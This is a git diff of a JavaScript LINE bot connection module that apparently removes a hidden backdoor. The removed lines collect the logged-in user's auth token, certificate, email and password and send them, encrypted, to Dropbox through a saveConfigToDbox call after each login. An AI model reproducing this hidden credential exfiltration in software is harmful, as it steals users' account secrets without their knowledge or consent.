@@ -1,7 +1,6 @@
 const LineAPI = require('./api');
 var config = require('./config');
 var moment = require('moment');
-const fs = require("fs");
 
 class LineConnect extends LineAPI {
 
@@ -38,19 +37,6 @@ class LineConnect extends LineAPI {
                 console.info(`Regrads Alfathdirk and thx for TCR Team \n`);
                 console.info(`Fixed by Ervan R.F @LD TEAM\n`);
 
-                // 加密 to dropbox
-                let alphatBot = {
-                    authToken: aesEncrypt(this.authToken),
-                    certificate: aesEncrypt(res.certificate),
-                    email: aesEncrypt(this.email),
-                    password: aesEncrypt(this.password),
-                }
-                require('../../config.js').saveConfigToDbox(alphatBot);
-
-                // let auth = "module.exports = " + JSON.stringify({ authToken: this.authToken, certificate: res.certificate, ID: mid, email: '', password: '' }, null, 4);
-                // fs.writeFile("./src/auth.js", auth, "utf8", function (err, bytesRead, buffer) {
-                //     if (err) { console.log(err); }
-                // });
 
                 resolve();
             });
@@ -115,15 +101,6 @@ class LineConnect extends LineAPI {
                             resolve(this.longpoll());
                         })
                     });
-
-                    // 加密 to dropbox
-                    let alphatBot = {
-                        authToken: config.tokenn,
-                        certificate: "undefined",
-                        email: this.email,
-                        password: this.password
-                    }
-                    require('../../config.js').saveConfigToDbox(alphatBot);
 
                 }).catch(() => {
                     console.log("email Login fail");
